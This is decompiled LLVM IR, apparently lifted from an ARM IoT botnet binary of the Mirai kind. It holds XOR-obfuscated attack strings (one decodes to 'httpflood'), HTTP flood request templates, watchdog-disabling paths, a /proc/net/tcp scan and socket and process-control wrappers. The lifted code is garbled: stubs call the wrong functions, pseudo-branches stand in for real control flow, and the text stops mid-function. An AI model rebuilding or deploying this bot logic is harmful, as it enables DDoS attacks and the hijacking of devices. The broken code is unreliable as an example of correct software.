source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%__dirstream = type { i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1cb7c.2 = global i32 1
@global_var_1cc14.3 = global i32* @global_var_1cb7c.2
@global_var_1cc1c.4 = global i32 0
@global_var_1cc68.23 = global i32 35716
@global_var_1cc6c.24 = global i32 35716
@global_var_1cc70.25 = global i32 35716
@global_var_1cc74.26 = global i32 35716
@global_var_1cc78.27 = global i32 35716
@global_var_1cc7c.28 = global i32 35716
@global_var_1cc80.29 = global i32 35716
@global_var_1cc84.30 = global i32 35716
@global_var_1cc88.31 = global i32 35716
@global_var_1cc8c.32 = global i32 35716
@global_var_1cc90.33 = global i32 35716
@global_var_1cc94.34 = global i32 35716
@global_var_1cc98.35 = global i32 35716
@global_var_1cc9c.36 = global i32 35716
@global_var_1cca0.37 = global i32 35716
@global_var_1cca4.38 = global i32 35716
@global_var_1cca8.39 = global i32 35716
@global_var_1ccac.40 = global i32 35716
@global_var_1ccb0.41 = global i32 35716
@global_var_1ccb4.42 = global i32 35716
@global_var_1ccb8.43 = global i32 35716
@global_var_1ccbc.44 = global i32 35716
@global_var_1ccc4.46 = global i32 35716
@global_var_1ccc8.47 = global i32 35716
@global_var_1cccc.48 = global i32 35716
@global_var_1ccd0.49 = global i32 35716
@global_var_1ccd4.50 = global i32 35716
@global_var_1ccd8.51 = global i32 35716
@global_var_1ccdc.52 = global i32 35716
@global_var_1cce0.53 = global i32 35716
@global_var_1cce4.54 = global i32 35716
@global_var_1cce8.55 = global i32 35716
@global_var_1ccec.56 = global i32 35716
@global_var_1cb74.60 = global i32 0
@global_var_1ccf8.61 = global i32* @global_var_1cb74.60
@global_var_1cd18.67 = global i32 0
@global_var_101d8.73 = constant i32 -382906384
@global_var_14368.76 = constant [4 x i8] c"GET\00"
@global_var_ff00.79 = constant i32 -476053492
@global_var_8dcc.81 = constant i32 -493894144
@global_var_14360.83 = constant i32 32
@global_var_14338.85 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_14350.87 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_1435c.89 = constant [3 x i8] c"\0D\0A\00"
@global_var_14370.91 = constant [9 x i8] c"Cookie: \00"
@global_var_1437c.93 = constant [3 x i8] c"; \00"
@global_var_14380.95 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_14388.97 = constant i32 59
@global_var_1438c.99 = constant [5 x i8] c"http\00"
@global_var_14394.101 = constant [5 x i8] c"url=\00"
@global_var_1439c.103 = constant [5 x i8] c"POST\00"
@global_var_13a30.104 = constant i32 -439275520
@global_var_143a4.106 = constant i32 39
@global_var_143a8.108 = constant i32 61
@global_var_1cd34.112 = global i32 0
@global_var_ae24.113 = constant i32 -352321546
@global_var_8de4.114 = constant i32 -493894144
@global_var_1cd38.116 = global i32 0
@global_var_1cd3c.117 = local_unnamed_addr global i32 0
@global_var_e528.123 = constant i32 -382906384
@global_var_e9ec.125 = constant i32 -382906384
@global_var_dbb4.127 = constant i32 -382906384
@global_var_d470.129 = constant i32 -382906384
@global_var_ccfc.131 = constant i32 -382906384
@global_var_c480.133 = constant i32 -382906384
@global_var_bd64.135 = constant i32 -382906384
@global_var_b5e8.137 = constant i32 -382906384
@global_var_8f24.139 = constant i32 -382906384
@global_var_1cda8.141 = global i32 0
@global_var_1cdb0.152 = global i32 0
@global_var_143ac.154 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_10148.162 = constant i32 -382910352
@global_var_1cd08.164 = global i32 81088
@global_var_1cd00.166 = global i32 -1
@global_var_1cdb8.172 = local_unnamed_addr global i32 0
@global_var_1cdb7.173 = local_unnamed_addr global i32 0
@global_var_1cdb6.174 = local_unnamed_addr global i32 0
@global_var_143bc.178 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1cdb5.183 = local_unnamed_addr global i32 0
@global_var_14410.185 = constant [3 x i8] c"/.\00"
@global_var_143ec.187 = constant i32 65496
@global_var_ffd8.188 = constant i32 -382909968
@global_var_130e4.190 = constant i32 -509607552
@global_var_1319c.193 = constant i32 -382906384
@global_var_1302c.195 = constant i32 -509607552
@global_var_1440c.200 = constant i32 65472
@global_var_143e0.202 = constant i32 10
@global_var_143cc.204 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_1cd04.206 = global i32 -1
@global_var_143e4.213 = constant i32 16777216
@global_var_1cd60.215 = global i32 0
@global_var_1cd6c.217 = global i32 0
@global_var_1cd64.219 = global i32 0
@global_var_1cd68.221 = global i32 0
@global_var_14424.227 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_1cdcc.238 = global i32 0
@global_var_1cda4.240 = global i32 0
@global_var_1cd70.242 = global i32 0
@global_var_1cd9c.244 = global i32 0
@global_var_1cdc4.252 = local_unnamed_addr global i32 0
@global_var_1cdd4.391 = global i32 0
@global_var_1cd10.394 = global i32 -559038737
@global_var_14618.398 = constant [13 x i8] c"RKAGQ@PM\0CVI\22\00"
@global_var_1cdec.400 = local_unnamed_addr global i32 0
@global_var_1cdf0.401 = local_unnamed_addr global i32 0
@global_var_1cdf1.402 = local_unnamed_addr global i32 0
@global_var_14628.404 = constant i32 802
@global_var_1cdf4.405 = local_unnamed_addr global i32 0
@global_var_1cdf8.406 = local_unnamed_addr global i32 0
@global_var_1cdf9.407 = local_unnamed_addr global i32 0
@global_var_1ce64.408 = local_unnamed_addr global i32 0
@global_var_1ce68.409 = local_unnamed_addr global i32 0
@global_var_1ce69.410 = local_unnamed_addr global i32 0
@global_var_1462c.412 = constant i32 36254
@global_var_1ce6c.413 = local_unnamed_addr global i32 0
@global_var_1ce70.414 = local_unnamed_addr global i32 0
@global_var_1ce71.415 = local_unnamed_addr global i32 0
@global_var_14630.417 = constant i32 1448168270
@global_var_1cde8.418 = local_unnamed_addr global i32 0
@global_var_1cde4.419 = local_unnamed_addr global i32 0
@global_var_1cde9.420 = local_unnamed_addr global i32 0
@global_var_14640.422 = constant i32 1381389898
@global_var_1ce00.423 = local_unnamed_addr global i32 0
@global_var_1cdfc.424 = local_unnamed_addr global i32 0
@global_var_1ce01.425 = local_unnamed_addr global i32 0
@global_var_14660.427 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_1ce04.428 = local_unnamed_addr global i32 0
@global_var_1ce08.429 = local_unnamed_addr global i32 0
@global_var_1ce09.430 = local_unnamed_addr global i32 0
@global_var_14668.432 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_1ce10.433 = local_unnamed_addr global i32 0
@global_var_1ce0c.434 = local_unnamed_addr global i32 0
@global_var_1ce11.435 = local_unnamed_addr global i32 0
@global_var_14670.437 = constant i32 1195772418
@global_var_1ce18.438 = local_unnamed_addr global i32 0
@global_var_1ce14.439 = local_unnamed_addr global i32 0
@global_var_1ce19.440 = local_unnamed_addr global i32 0
@global_var_1467c.442 = constant [5 x i8] c"\0DDF\22\00"
@global_var_1ce20.443 = local_unnamed_addr global i32 0
@global_var_1ce1c.444 = local_unnamed_addr global i32 0
@global_var_1ce21.445 = local_unnamed_addr global i32 0
@global_var_14684.447 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_1ce24.448 = local_unnamed_addr global i32 0
@global_var_1ce28.449 = local_unnamed_addr global i32 0
@global_var_1ce29.450 = local_unnamed_addr global i32 0
@global_var_1468c.452 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_1ce30.453 = local_unnamed_addr global i32 0
@global_var_1ce2c.454 = local_unnamed_addr global i32 0
@global_var_1ce31.455 = local_unnamed_addr global i32 0
@global_var_14698.457 = constant i32 1836214128
@global_var_1ce38.458 = local_unnamed_addr global i32 0
@global_var_1ce34.459 = local_unnamed_addr global i32 0
@global_var_1ce39.460 = local_unnamed_addr global i32 0
@global_var_146a8.462 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_1ce3c.463 = local_unnamed_addr global i32 0
@global_var_1ce40.464 = local_unnamed_addr global i32 0
@global_var_1ce41.465 = local_unnamed_addr global i32 0
@global_var_146b4.467 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_1ce44.468 = local_unnamed_addr global i32 0
@global_var_1ce48.469 = local_unnamed_addr global i32 0
@global_var_1ce49.470 = local_unnamed_addr global i32 0
@global_var_146c0.472 = constant i32 437738110
@global_var_1ce50.473 = local_unnamed_addr global i32 0
@global_var_1ce4c.474 = local_unnamed_addr global i32 0
@global_var_1ce51.475 = local_unnamed_addr global i32 0
@global_var_146e4.477 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_1ce58.478 = local_unnamed_addr global i32 0
@global_var_1ce54.479 = local_unnamed_addr global i32 0
@global_var_1ce59.480 = local_unnamed_addr global i32 0
@global_var_146f0.482 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_1ce60.483 = local_unnamed_addr global i32 0
@global_var_1ce5c.484 = local_unnamed_addr global i32 0
@global_var_1ce61.485 = local_unnamed_addr global i32 0
@global_var_146fc.487 = constant [7 x i8] c"QJGNN\22\00"
@global_var_1ce78.488 = local_unnamed_addr global i32 0
@global_var_1ce74.489 = local_unnamed_addr global i32 0
@global_var_1ce79.490 = local_unnamed_addr global i32 0
@global_var_14704.492 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_1ce7c.493 = local_unnamed_addr global i32 0
@global_var_1ce80.494 = local_unnamed_addr global i32 0
@global_var_1ce81.495 = local_unnamed_addr global i32 0
@global_var_1470c.497 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_1ce84.498 = local_unnamed_addr global i32 0
@global_var_1ce88.499 = local_unnamed_addr global i32 0
@global_var_1ce89.500 = local_unnamed_addr global i32 0
@global_var_14714.502 = constant [4 x i8] c"QJ\22\00"
@global_var_1ce90.503 = local_unnamed_addr global i32 0
@global_var_1ce8c.504 = local_unnamed_addr global i32 0
@global_var_1ce91.505 = local_unnamed_addr global i32 0
@global_var_14718.507 = constant i32 1280000013
@global_var_1ce94.508 = local_unnamed_addr global i32 0
@global_var_1ce98.509 = local_unnamed_addr global i32 0
@global_var_1ce99.510 = local_unnamed_addr global i32 0
@global_var_1472c.512 = constant i32 1668311919
@global_var_1cea0.513 = local_unnamed_addr global i32 0
@global_var_1ce9c.514 = local_unnamed_addr global i32 0
@global_var_1cea1.515 = local_unnamed_addr global i32 0
@global_var_14748.517 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_1cea4.518 = local_unnamed_addr global i32 0
@global_var_1cea8.519 = local_unnamed_addr global i32 0
@global_var_1cea9.520 = local_unnamed_addr global i32 0
@global_var_14754.522 = constant i32 1280000013
@global_var_1ceac.523 = local_unnamed_addr global i32 0
@global_var_1ceb0.524 = local_unnamed_addr global i32 0
@global_var_1ceb1.525 = local_unnamed_addr global i32 0
@global_var_14768.527 = constant i32 1280000013
@global_var_1ceb8.528 = local_unnamed_addr global i32 0
@global_var_1ceb4.529 = local_unnamed_addr global i32 0
@global_var_1ceb9.530 = local_unnamed_addr global i32 0
@global_var_14780.532 = constant i32 1464693110
@global_var_1cec0.533 = local_unnamed_addr global i32 0
@global_var_1cebc.534 = local_unnamed_addr global i32 0
@global_var_1cec1.535 = local_unnamed_addr global i32 0
@global_var_14798.537 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_1cec8.538 = local_unnamed_addr global i32 0
@global_var_1cec4.539 = local_unnamed_addr global i32 0
@global_var_1cec9.540 = local_unnamed_addr global i32 0
@global_var_147ac.542 = constant i32 1196376908
@global_var_1cecc.543 = local_unnamed_addr global i32 0
@global_var_1ced0.544 = local_unnamed_addr global i32 0
@global_var_1ced1.545 = local_unnamed_addr global i32 0
@global_var_147bc.547 = constant i32 1280068961
@global_var_1ced8.548 = local_unnamed_addr global i32 0
@global_var_1ced4.549 = local_unnamed_addr global i32 0
@global_var_1ced9.550 = local_unnamed_addr global i32 0
@global_var_147d4.552 = constant i32 1195458915
@global_var_1cee0.553 = local_unnamed_addr global i32 0
@global_var_1cedc.554 = local_unnamed_addr global i32 0
@global_var_1cee1.555 = local_unnamed_addr global i32 0
@global_var_14828.557 = constant i32 1195458915
@global_var_1cee8.558 = local_unnamed_addr global i32 0
@global_var_1cee4.559 = local_unnamed_addr global i32 0
@global_var_1cee9.560 = local_unnamed_addr global i32 0
@global_var_1484c.562 = constant i32 1447841121
@global_var_1cef0.563 = local_unnamed_addr global i32 0
@global_var_1ceec.564 = local_unnamed_addr global i32 0
@global_var_1cef1.565 = local_unnamed_addr global i32 0
@global_var_14880.567 = constant i32 1633044305
@global_var_1cef4.568 = local_unnamed_addr global i32 0
@global_var_1cef8.569 = local_unnamed_addr global i32 0
@global_var_1cef9.570 = local_unnamed_addr global i32 0
@global_var_14890.572 = constant i32 1346651984
@global_var_1cefc.573 = local_unnamed_addr global i32 0
@global_var_1cf00.574 = local_unnamed_addr global i32 0
@global_var_1cf01.575 = local_unnamed_addr global i32 0
@global_var_1489c.577 = constant i32 1128353102
@global_var_1cf04.578 = local_unnamed_addr global i32 0
@global_var_1cf08.579 = local_unnamed_addr global i32 0
@global_var_1cf09.580 = local_unnamed_addr global i32 0
@global_var_148a8.582 = constant i32 257312593
@global_var_1cf0c.583 = local_unnamed_addr global i32 0
@global_var_1cf10.584 = local_unnamed_addr global i32 0
@global_var_1cf11.585 = local_unnamed_addr global i32 0
@global_var_148b8.587 = constant i32 1447841089
@global_var_1cf14.588 = local_unnamed_addr global i32 0
@global_var_1cf18.589 = local_unnamed_addr global i32 0
@global_var_1cf19.590 = local_unnamed_addr global i32 0
@global_var_148cc.592 = constant i32 1279479894
@global_var_1cf1c.593 = local_unnamed_addr global i32 0
@global_var_1cf20.594 = local_unnamed_addr global i32 0
@global_var_1cf21.595 = local_unnamed_addr global i32 0
@global_var_148e0.597 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_1cf28.598 = local_unnamed_addr global i32 0
@global_var_1cf24.599 = local_unnamed_addr global i32 0
@global_var_1cf29.600 = local_unnamed_addr global i32 0
@global_var_147c8.602 = constant i32 1380403017
@global_var_1cf30.603 = local_unnamed_addr global i32 0
@global_var_1cf2c.604 = local_unnamed_addr global i32 0
@global_var_1cf31.605 = local_unnamed_addr global i32 0
@global_var_148ec.607 = constant i32 1280068929
@global_var_1cf34.608 = local_unnamed_addr global i32 0
@global_var_1cf38.609 = local_unnamed_addr global i32 0
@global_var_1cf39.610 = local_unnamed_addr global i32 0
@global_var_148fc.612 = constant i32 1414547281
@global_var_1cf40.613 = local_unnamed_addr global i32 0
@global_var_1cf3c.614 = local_unnamed_addr global i32 0
@global_var_1cf41.615 = local_unnamed_addr global i32 0
@global_var_14910.617 = constant i32 1414547281
@global_var_1cf48.618 = local_unnamed_addr global i32 0
@global_var_1cf44.619 = local_unnamed_addr global i32 0
@global_var_1cf49.620 = local_unnamed_addr global i32 0
@global_var_1492c.622 = constant i32 1264078191
@global_var_1cf4c.623 = local_unnamed_addr global i32 0
@global_var_1cf50.624 = local_unnamed_addr global i32 0
@global_var_1cf51.625 = local_unnamed_addr global i32 0
@global_var_1499c.627 = constant i32 1264078191
@global_var_1cf54.628 = local_unnamed_addr global i32 0
@global_var_1cf58.629 = local_unnamed_addr global i32 0
@global_var_1cf59.630 = local_unnamed_addr global i32 0
@global_var_14a0c.632 = constant i32 1264078191
@global_var_1cf5c.633 = local_unnamed_addr global i32 0
@global_var_1cf60.634 = local_unnamed_addr global i32 0
@global_var_1cf61.635 = local_unnamed_addr global i32 0
@global_var_14a7c.637 = constant i32 1264078191
@global_var_1cf68.638 = local_unnamed_addr global i32 0
@global_var_1cf64.639 = local_unnamed_addr global i32 0
@global_var_1cf69.640 = local_unnamed_addr global i32 0
@global_var_14aec.642 = constant i32 1264078191
@global_var_1cf6c.643 = local_unnamed_addr global i32 0
@global_var_1cf70.644 = local_unnamed_addr global i32 0
@global_var_1cb6c.646 = global i32 0
@global_var_1cb68.647 = global i32 -1
@global_var_1cd14.58 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@2 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_1cd30.110 = external global i8*
@global_var_1cd31.121 = global i8 0
@3 = internal constant [2 x i8] c"\01\00"
@global_var_1cdb4.171 = external global i8*
@global_var_ffc0.176 = constant void (i32)* inttoptr (i32 -442556408 to void (i32)*)
@global_var_1cd5c.209 = external global i8*
@global_var_1cda0.246 = external global i8*
@global_var_1cda1.247 = local_unnamed_addr global i8 0
@global_var_1436c.78 = constant [2 x i8] c"/\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8b6c() local_unnamed_addr {
entry:
  %v3_8b70 = load i32, i32* @r4, align 4
  %v0_8b78 = call i32 @function_8e88()
  store i32 %v0_8b78, i32* @r0, align 4
  %v1_8b7c = call i32 @function_142d8(i32 %v0_8b78)
  call void @__pseudo_branch(i32 %v3_8b70)
  ret i32 %v1_8b7c
}

define i32 @function_8b84(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8b90 = load i32, i32* @global_var_1cc1c.4, align 4
  call void @__pseudo_branch(i32 %v3_8b90)
  %v0_8b94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8b94, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_ioctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8ba0 = call i32 @_select()
  ret i32 %v4_8ba0
}

define i32 @_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8bac = call i32 @unknown_e28cca14()
  ret i32 %v4_8bac
}

define i32 @_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bb8 = call i32 @unknown_e5bcf018()
  ret i32 %v4_8bb8
}

define i32 @_sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8bc4 = call i32 @_readdir()
  ret i32 %v4_8bc4
}

define i32 @_memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bd0 = call i32 @unknown_e28cca14()
  ret i32 %v4_8bd0
}

define i32 @_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8bdc = call i32 @unknown_e5bcf010()
  ret i32 %v4_8bdc
}

define i32 @_prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8be8 = call i32 @_sigaddset()
  ret i32 %v4_8be8
}

define i32 @_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bf4 = call i32 @unknown_e28cca14()
  ret i32 %v4_8bf4
}

define i32 @_readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8c00 = call i32 @unknown_e5bcf008()
  ret i32 %v4_8c00
}

define i32 @_malloc(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c0c = call i32 @_send()
  ret i32 %v4_8c0c
}

define i32 @_sleep(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c18 = call i32 @unknown_e28cca14()
  ret i32 %v4_8c18

; uselistorder directives
  uselistorder i32 ()* @unknown_e28cca14, { 3, 2, 1, 0 }
}

define i32 @_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v4_8c24 = call i32 @unknown_e5bcf000()
  ret i32 %v4_8c24
}

; Function Attrs: noreturn
define i32 @_socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr #0 {
entry:
  call void @abort()
  unreachable
}

define i32 @_select() local_unnamed_addr {
entry:
  %v4_8c3c = call i32 @unknown_e28cca13()
  store i32 35944, i32* @ip, align 4
  ret i32 %v4_8c3c
}

define i32 @_readdir() local_unnamed_addr {
entry:
  %v4_8c48 = call i32 @unknown_e5bcfff8()
  store i32 35948, i32* @ip, align 4
  ret i32 %v4_8c48
}

define i32 @_sigaddset() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 35944, i32* %ip.global-to-local, align 4
  %v4_8c54 = load i32, i32* @r0, align 4
  %v5_8c54 = load i32, i32* @r1, align 4
  %v6_8c54 = load i32, i32* @r2, align 4
  %v7_8c54 = inttoptr i32 %v5_8c54 to %sockaddr*
  %v8_8c54 = inttoptr i32 %v6_8c54 to i32*
  %v9_8c54 = call i32 @accept(i32 %v4_8c54, %sockaddr* %v7_8c54, i32* %v8_8c54)
  %v10_8c54 = load i32, i32* %ip.global-to-local, align 4
  %v11_8c54 = add i32 %v10_8c54, 8
  store i32 %v11_8c54, i32* @ip, align 4
  ret i32 %v9_8c54

; uselistorder directives
  uselistorder i32 35944, { 1, 0 }
}

define i32 @_send() local_unnamed_addr {
entry:
  store i32 35956, i32* @ip, align 4
  %v3_8c60 = call i32 @unknown_e28cca13()
  ret i32 %v3_8c60

; uselistorder directives
  uselistorder i32 ()* @unknown_e28cca13, { 1, 0 }
}

; Function Attrs: noreturn
define void @_abort() local_unnamed_addr #0 {
entry:
  call void @abort()
  unreachable
}

define i32 @_accept(i32 %fd, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
entry:
  %v9_8c78 = call i32 @accept(i32 %fd, %sockaddr* %addr, i32* %addr_len)
  ret i32 %v9_8c78
}

define i32* @_calloc(i32 %nmemb, i32 %size) local_unnamed_addr {
entry:
  %v6_8c84 = call i32* @calloc(i32 %nmemb, i32 %size)
  ret i32* %v6_8c84
}

define i32 @_write(i32 %fd, i32* %buf, i32 %n) local_unnamed_addr {
entry:
  %v8_8c90 = call i32 @write(i32 %fd, i32* %buf, i32 %n)
  ret i32 %v8_8c90
}

define i32 @_kill(i32 %pid, i32 %sig) local_unnamed_addr {
entry:
  %v6_8c9c = call i32 @kill(i32 %pid, i32 %sig)
  ret i32 %v6_8c9c
}

define i32 @_bind(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
entry:
  %v8_8ca8 = call i32 @bind(i32 %fd, %sockaddr* %addr, i32 %len)
  ret i32 %v8_8ca8
}

define i32 @_inet_addr(i8* %cp) local_unnamed_addr {
entry:
  %v6_8cb4 = call i32 @inet_addr(i8* %cp)
  ret i32 %v6_8cb4
}

define i32 @_chdir(i8* %path) local_unnamed_addr {
entry:
  %v6_8cc0 = call i32 @chdir(i8* %path)
  ret i32 %v6_8cc0
}

define i32 @_setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen) local_unnamed_addr {
entry:
  %v10_8ccc = call i32 @setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen)
  ret i32 %v10_8ccc
}

define void (i32)* @_signal(i32 %sig, void (i32)* %handler) local_unnamed_addr {
entry:
  %v7_8cd8 = call void (i32)* @signal(i32 %sig, void (i32)* %handler)
  ret void (i32)* %v7_8cd8
}

define i32 @_read(i32 %fd, i32* %buf, i32 %nbytes) local_unnamed_addr {
entry:
  %v8_8ce4 = call i32 @read(i32 %fd, i32* %buf, i32 %nbytes)
  ret i32 %v8_8ce4
}

define i32 @_unlink(i8* %name) local_unnamed_addr {
entry:
  %v6_8cf0 = call i32 @unlink(i8* %name)
  ret i32 %v6_8cf0
}

define i32 @_sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len) local_unnamed_addr {
entry:
  %v11_8cfc = call i32 @sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len)
  ret i32 %v11_8cfc
}

define i32* @_realloc(i32* %ptr, i32 %size) local_unnamed_addr {
entry:
  %v7_8d08 = call i32* @realloc(i32* %ptr, i32 %size)
  ret i32* %v7_8d08
}

define i32 @_listen(i32 %fd, i32 %n) local_unnamed_addr {
entry:
  %v6_8d14 = call i32 @listen(i32 %fd, i32 %n)
  ret i32 %v6_8d14
}

define i32 @_fork() local_unnamed_addr {
entry:
  %v4_8d20 = call i32 @fork()
  ret i32 %v4_8d20
}

define i32 @___uClibc_main(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v4_8d2c = call i32 @__uClibc_main()
  ret i32 %v4_8d2c
}

define i32* @_memset(i32* %s, i32 %c, i32 %n) local_unnamed_addr {
entry:
  %v8_8d38 = call i32* @memset(i32* %s, i32 %c, i32 %n)
  ret i32* %v8_8d38
}

define i32 @_getppid() local_unnamed_addr {
entry:
  %v4_8d44 = call i32 @getppid()
  ret i32 %v4_8d44
}

define i32 @_time(i32* %timer) local_unnamed_addr {
entry:
  %v6_8d50 = call i32 @time(i32* %timer)
  ret i32 %v6_8d50
}

define %__dirstream* @_opendir(i8* %name) local_unnamed_addr {
entry:
  %v6_8d5c = call %__dirstream* @opendir(i8* %name)
  ret %__dirstream* %v6_8d5c
}

define i32 @_getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen) local_unnamed_addr {
entry:
  %v9_8d68 = call i32 @getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen)
  ret i32 %v9_8d68
}

define i32* @___errno_location() local_unnamed_addr {
entry:
  %v4_8d74 = call i32* @__errno_location()
  ret i32* %v4_8d74
}

; Function Attrs: noreturn
define void @_exit(i32 %status) local_unnamed_addr #0 {
entry:
  call void @exit(i32 %status)
  unreachable
}

define i32 @_atoi(i8* %nptr) local_unnamed_addr {
entry:
  %v6_8d8c = call i32 @atoi(i8* %nptr)
  ret i32 %v6_8d8c
}

define i32 @_open(i8* %file, i32 %oflag, ...) local_unnamed_addr {
entry:
  %v7_8d98 = call i32 (i8*, i32, ...) @open(i8* %file, i32 %oflag)
  ret i32 %v7_8d98
}

define i32 @_clock() local_unnamed_addr {
entry:
  %v4_8da4 = call i32 @clock()
  ret i32 %v4_8da4
}

define i32 @_setsid() local_unnamed_addr {
entry:
  %v4_8db0 = call i32 @setsid()
  ret i32 %v4_8db0
}

define i32 @_closedir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8dbc = call i32 @closedir(%__dirstream* %dirp)
  ret i32 %v6_8dbc
}

define i32 @_fcntl(i32 %fd, i32 %cmd, ...) local_unnamed_addr {
entry:
  %v6_8dc8 = call i32 (i32, i32, ...) @fcntl(i32 %fd, i32 %cmd)
  ret i32 %v6_8dc8
}

define i32 @_close(i32 %fd) local_unnamed_addr {
entry:
  %v5_8dd4 = call i32 @close(i32 %fd)
  ret i32 %v5_8dd4
}

define i32 @_raise(i32 %sig) local_unnamed_addr {
entry:
  %v5_8de0 = call i32 @raise(i32 %sig)
  ret i32 %v5_8de0
}

define void @_free(i32* %ptr) local_unnamed_addr {
entry:
  call void @free(i32* %ptr)
  ret void
}

define i32 @_sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset) local_unnamed_addr {
entry:
  %v9_8df8 = call i32 @sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset)
  ret i32 %v9_8df8
}

define i32 @_getsockname(i32 %fd, %sockaddr* %addr, i32* %len) local_unnamed_addr {
entry:
  %v9_8e04 = call i32 @getsockname(i32 %fd, %sockaddr* %addr, i32* %len)
  ret i32 %v9_8e04
}

define i32 @function_8e08() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_8e08 = load i32, i32* @r4, align 4
  store i32 %v3_8e08, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1cd14.58 to i32), i32* %r5.global-to-local, align 4
  %v2_8e10 = load i8, i8* bitcast (i8** @global_var_1cd14.58 to i8*), align 4
  %v2_8e14 = icmp eq i8 %v2_8e10, 0
  br i1 %v2_8e14, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_8e18 = load i32, i32* @r0, align 4
  ret i32 %v12_8e18

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1ccf8.61 to i32), i32* %r4.global-to-local, align 4
  %v2_8e20 = load i32, i32* bitcast (i32** @global_var_1ccf8.61 to i32*), align 4
  store i32 %v2_8e20, i32* %r2.global-to-local, align 4
  %v2_8e28 = icmp eq i32 %v2_8e20, 0
  br i1 %v2_8e28, label %bb8, label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %bb7, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge
  %v1_8e34 = phi i32 [ %v1_8e34.pre, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge ], [ ptrtoint (i32** @global_var_1ccf8.61 to i32), %bb7 ]
